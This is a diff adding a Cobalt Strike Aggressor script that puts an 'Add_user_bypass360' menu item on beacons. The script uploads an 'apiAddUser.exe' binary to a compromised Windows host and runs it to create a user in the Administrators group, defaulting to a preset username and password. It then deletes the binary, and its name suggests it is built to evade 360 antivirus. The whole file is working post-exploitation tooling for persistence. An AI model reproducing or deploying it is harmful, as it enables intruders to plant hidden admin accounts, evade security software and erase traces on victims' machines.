@@ -1,0 +1,35 @@
+#Add_user_bypass360 using windows api
+
+sub AddUserToGroup {
+    if (-isadmin $bid['id']){
+        $u = join(" ", @($3['username']));
+        $p = join(" ", @($3['password']));
+        $g = join(" ", @($3['group']));
+        bupload($bid, script_resource("apiAddUser.exe"));
+        bshell($bid, "apiAddUser.exe $u $p $g");
+        bshell($bid, "del /f /s /q apiAddUser.exe");
+    }
+    else{
+        blog($bid, "\c4Admin rights needed!");
+        blog($bid, "\c4Add user failed!")
+    }
+    
+}
+
+popup beacon_bottom{
+    item "&Add_user_bypass360"{
+        $bid = $1;
+        $dialog = dialog("Add_user_bypass360", %(username => "john", password => "1qa2wszx", group => "Administrators", bid => $bid), &AddUserToGroup);
+        drow_text($dialog,"username","UserName: ");
+        drow_text($dialog,"password","PassWord: ");
+        drow_text($dialog,"group","Group: ");
+        dbutton_action($dialog,"Go");
+        dialog_show($dialog);
+    }
+}
+
+#alias adduser{
+#    btask($1,"Add User to localgroup!","T1136");
+#    bshell($1,"apiAddUser.exe $2 $3 $4");
+#    #println("argvs: $2 $3 $4");
+#}
